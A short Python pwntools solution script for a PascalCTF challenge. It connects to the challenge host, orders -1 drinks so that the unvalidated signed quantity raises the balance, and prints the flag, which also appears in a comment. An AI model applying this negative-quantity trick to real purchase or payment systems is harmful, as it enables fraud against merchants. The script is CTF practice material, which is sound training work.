from pwn import *

r = remote('malta.ctf.pascalctf.it', 9001)
r.sendlineafter(b'Select a drink: ', b'10')

# No validation of (signed) drinks number. Which once 'sold'
#               balance -= quantity * price
# allows the user to get the usually impossible balance.
r.sendlineafter(b'How many drinks do you want? ', b'-1')
r.recvuntil(b'secret recipe: ')
flag = r.recvline().decode().strip()

# pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}
print(f"flag: {flag}")
r.close()
